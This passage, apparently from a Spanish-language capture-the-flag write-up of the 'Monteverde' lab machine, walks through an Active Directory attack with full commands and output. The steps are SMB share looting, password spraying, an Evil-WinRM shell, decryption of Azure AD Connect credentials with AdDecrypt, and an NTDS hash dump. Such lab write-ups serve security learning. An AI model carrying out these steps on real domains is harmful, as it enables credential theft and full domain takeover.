+SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
+SMB         10.129.228.111  445    MONTEVERDE       <span class="nb">users</span><span class="nv">$ </span>         READ
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a enumerar ese recurso compartido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient <span class="nt">-U</span> SABatchJobs //10.129.228.111/users<span class="err">$</span>
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>ABatchJobs]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:12:48 2020
+  ..                                  D        0  Fri Jan  3 07:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
+  mhope                               D        0  Fri Jan  3 07:41:18 2020
+  roleary                             D        0  Fri Jan  3 07:10:30 2020
+  smorgan                             D        0  Fri Jan  3 07:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un archivo llamado <strong>azure.xml</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:41:18 2020
+  ..                                  D        0  Fri Jan  3 07:41:18 2020
+  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+smb: <span class="se">\m</span>hope<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descárgalo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> get azure.xml
+getting file <span class="se">\m</span>hope<span class="se">\a</span>zure.xml of size 1212 as azure.xml <span class="o">(</span>3.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.3 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si examinamos el archivo encontramos una contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>azure.xml
+&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
+  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"StartDate"</span><span class="o">&gt;</span>2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"EndDate"</span><span class="o">&gt;</span>2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">"KeyId"</span><span class="o">&gt;</span>00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>4n0therD4y@n0th3r<span class="nv">$&lt;</span>/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Como ahora tenemos una contraseña nueva lo que podemos hacer básicamente es hacer otro <code class="language-plaintext highlighter-rouge">Password Spray</code> para ver si algún usuario utiliza la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="err">$</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos emplear <code class="language-plaintext highlighter-rouge">evil-winrm</code> gracias a que nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> y el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Windows Remote Management</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> mhope <span class="nt">-p</span> 4n0therD4y@n0th3r<span class="err">$</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\m</span>hope
+</code></pre></div></div>
+
+<h1 id="usertxt">user.txt</h1>
+
+<ul>
+  <li>Ahora ya podemos leer la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+2314ead90ec16835111baba6c8982424
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>Si vemos información del usuario que tenemos pertenecemos al grupo <code class="language-plaintext highlighter-rouge">Azure Admins</code> <a href="https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB">https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Microsoft Azure es una plataforma de computación en la nube creado por Microsoft para construir, probar, desplegar y administrar aplicaciones y servicios mediante el uso de sus centros de datos.</p>
+</blockquote>
+
+<ul>
+  <li>Si vamos ala raíz hay una carpeta con el nombre <code class="language-plaintext highlighter-rouge">Program Files</code> que contiene archivos sobre este servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s1">'Program Files'</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogram Files
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         1/2/2020   9:36 PM                Common Files
+d-----         1/2/2020   2:46 PM                internet explorer
+d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
+d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
+d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
+d-----         1/2/2020   2:38 PM                Microsoft SQL Server
+d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
+d-----         1/2/2020   2:32 PM                Microsoft.NET
+d-----         1/3/2020   5:28 AM                PackageManagement
+d-----         1/2/2020   9:37 PM                VMware
+d-r---         1/2/2020   2:46 PM                Windows Defender
+d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
+d-----        9/15/2018  12:19 AM                Windows Mail
+d-----         1/2/2020   2:46 PM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----         1/2/2020   2:46 PM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                Windows Security
+d-----         1/3/2020   5:28 AM                WindowsPowerShell
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt;
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a>, <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a>.</li>
+</ul>
+
+<blockquote>
+  <p>The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc.</p>
+</blockquote>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/JEIR5oGCwdg?si=7OpXxOEi_svvy2Di" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<ul>
+  <li>
+    <p>En el post nos comparten el siguiente repositorio <a href="https://github.com/VbScrub/AdSyncDecrypt/releases">https://github.com/VbScrub/AdSyncDecrypt/releases</a>.</p>
+  </li>
+  <li>
+    <p>Nos dicen que tenemos que estas en la siguiente ruta para que funcione.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync&gt; <span class="nb">cd</span> <span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin'</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in
+
+
+</span>Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         1/2/2020   2:53 PM                ADSync
+d-----         1/2/2020   2:53 PM                ADSyncDiagnostics
+d-----         1/2/2020   2:53 PM                Assemblies
+d-----         1/2/2020   2:53 PM                Microsoft.VC100.CRT
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          32640 AADConfig.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          78920 AADPasswordResetExtension.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM        1579904 configdb.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          15416 csdelete.exe
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          35896 csexport.exe
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          25656 CSExportAnalyzer.exe
+<span class="nt">-a----</span>         1/2/2020   2:53 PM            240 InstalledServiceInstances.config
+<span class="nt">-a----</span>        8/31/2018   4:56 PM          86400 libutils.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM         284816 ManagedCustomActions.CA
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          37944 mapackager.exe
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         335744 mcrypt.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          98688 Microsoft.Azure.ActiveDirectory.Client.Framework.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         125496 Microsoft.Azure.ActiveDirectory.Synchronization.Config.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          94776 Microsoft.Azure.ActiveDirectory.Synchronization.Framework.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          37432 Microsoft.Azure.ActiveDirectory.Synchronization.PowerShellConfigAdapter.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          29568 Microsoft.Azure.ActiveDirectory.Synchronization.ProvisioningWebServiceAdapter.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          85568 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll
+<span class="nt">-a----</span>        6/20/2017   1:52 PM             70 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll.config
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          30280 Microsoft.CredentialManagement.OnPremisesPasswordReset.Shared.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         143416 Microsoft.IdentityManagement.Error.ErrorBridge.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          18488 Microsoft.IdentityManagement.ManagedLogger.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         221056 Microsoft.IdentityManagement.PowerShell.ObjectModel.dll
+<span class="nt">-a----</span>        5/23/2018   7:46 PM         295024 Microsoft.IdentityModel.Clients.ActiveDirectory.dll
+<span class="nt">-a----</span>        5/23/2018   7:46 PM          22128 Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          17280 Microsoft.MetadirectoryServices.DataAccess.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          16768 Microsoft.MetadirectoryServices.Host.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          66432 Microsoft.MetadirectoryServices.Impl.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          27520 Microsoft.MetadirectoryServices.LDAPQueryClient.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          26688 Microsoft.MetadirectoryServices.PasswordHashSynchronization.Types.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          54344 Microsoft.MetadirectoryServices.Scheduler.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         507264 Microsoft.Online.Deployment.Framework.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          82304 Microsoft.Online.Deployment.PowerShell.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         116608 Microsoft.Online.PasswordSynchronization.Cryptography.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         136248 Microsoft.Online.PasswordSynchronization.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          23424 Microsoft.Online.PasswordSynchronization.Resources.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         196664 Microsoft.Online.PasswordSynchronization.Rpc.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM        3540032 Microsoft.ServiceBus.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM        2556984 miiserver.exe
+<span class="nt">-a----</span>        8/31/2018   4:41 PM           5830 miiserver.exe.config
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          99896 miiskmu.exe
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          85568 mixedmodeutils.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         360504 mmscntrl.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          97848 mmsevent.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         725048 mmsmaad.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         567352 mmsmaext.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM        1424256 mmsmastate.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         431160 mmsmaxml.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          31288 mmsperf.dll
+<span class="nt">-a----</span>        8/31/2018   4:41 PM           5686 mmsperf.h
+<span class="nt">-a----</span>        8/31/2018   4:41 PM          12162 mmsperf.ini
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          37432 mmsperfmon.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         151096 mmsps.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         528768 mmsscpth.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          33152 MMSSERVERRCW.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         520064 mmsuihlp.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         222776 mmsutils.dll
+<span class="nt">-a----</span>        8/31/2018   4:41 PM            978 mmswmi-x.mof
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         133688 mmswmi.dll
+<span class="nt">-a----</span>        8/31/2018   4:41 PM           8441 mmswmi.mof
+<span class="nt">-a----</span>        8/31/2018   4:55 PM         103496 PasswordHashConnectorManager.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM          37952 PasswordHashSyncExtension.dll
+<span class="nt">-a----</span>        8/31/2018   4:53 PM          44104 Security.Cryptography.dll
+<span class="nt">-a----</span>        8/31/2018   4:55 PM        1462328 storechk.exe
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          62008 SyncClrhost.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         135736 SyncRuleExpressions.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         172088 SyncRulesEngine.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM         200760 SyncSetupUtl.dll
+<span class="nt">-a----</span>        8/31/2018   4:54 PM          26176 Tracing.dll
+<span class="nt">-a----</span>        8/31/2018   4:41 PM          16510 Tracing.man
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>ADSync generalmente se ejecuta como un servicio en un servidor designado dentro de la infraestructura de la red local. Es responsable de mantener la sincronización continua entre el directorio activo local y Azure AD, asegurando que cualquier cambio realizado en uno de los directorios se refleje adecuadamente en el otro.</p>
+</blockquote>
+
+<ul>
+  <li>Si descomprimimos el <code class="language-plaintext highlighter-rouge">.zip</code> vemos que obtenemos un <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.ddl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z x AdDecrypt.zip
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 152818 bytes <span class="o">(</span>150 KiB<span class="o">)</span>
+
+Extracting archive: AdDecrypt.zip
+<span class="nt">--</span>
+Path <span class="o">=</span> AdDecrypt.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 152818
+
+Everything is Ok
+
+Files: 2
+Size:       349096
+Compressed: 152818
+➜  content <span class="nb">ls
+</span>AdDecrypt.exe  AdDecrypt.zip  azure.xml  mcrypt.dll  users.txt
+</code></pre></div></div>
+
+<ul>
+  <li>En el post nos dicen que tenemos que subir los 2 archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\p</span>rogramdata
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         1/2/2020   4:12 PM                AADConnect
+d---s-         1/3/2020   4:47 AM                Microsoft
+d-----        3/31/2024  11:35 AM                regid.1991-06.com.microsoft
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-----         1/2/2020   9:15 PM                USOPrivate
+d-----         1/2/2020   9:15 PM                USOShared
+d-----         1/2/2020   9:37 PM                VMware
+d-----         1/2/2020   2:35 PM                VsTelemetry
+<span class="nt">-a----</span>        3/31/2024   1:22 PM          14848 AdDecrypt.exe
+<span class="nt">-a----</span>        3/31/2024   1:22 PM         334248 mcrypt.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo ejecutamos para ver la contraseña en texto plano.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> C:<span class="se">\p</span>rogramdata<span class="se">\A</span>dDecrypt.exe <span class="nt">-FullSQL</span>
+
+<span class="o">======================</span>
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+<span class="o">======================</span>
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+</code></pre></div></div>
+
+<h2 id="roottxt">root.txt</h2>
+
+<ul>
+  <li>Ahora ya nos podemos conectar gracias a que el ejecutable descifro las credenciales almacenadas dentro de la configuración <code class="language-plaintext highlighter-rouge">Azure AD Sync</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah!
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+026476efa67f5ba4e205392bb78817e4
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="extra">Extra</h2>
+
+<ul>
+  <li>Aquí tenemos los hashes NT de todos los usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ crackmapexec smb 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah! <span class="nt">--nt</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\a</span>dministrator:d0m@in4dminyeah! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
+SMB         10.129.228.111  445    MONTEVERDE       Administrator:500:aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea:::
+SMB         10.129.228.111  445    MONTEVERDE       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.228.111  445    MONTEVERDE       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3480c0ed5001f14fa7a49fdf016043ff:::
+SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2:1104:aad3b435b51404eeaad3b435b51404ee:599716220acac74a2d9049230d3a8b06:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\m</span>hope:1601:aad3b435b51404eeaad3b435b51404ee:f875f9a71efc6b0ee93dd906aedbc8b6:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:2602:aad3b435b51404eeaad3b435b51404ee:fd980edb4732d8175a52a9b5e1520bc1:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-ata:2603:aad3b435b51404eeaad3b435b51404ee:d192ea098c69b7d26c50808a5ac75bea:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:2604:aad3b435b51404eeaad3b435b51404ee:2e4de9439cfd99f861dec8fc460c47e3:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:2605:aad3b435b51404eeaad3b435b51404ee:6bd17d9707c3da465b96cdf0e1a3a4d6:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\d</span>galanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e53da58f0885736:::
+SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\r</span>oleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
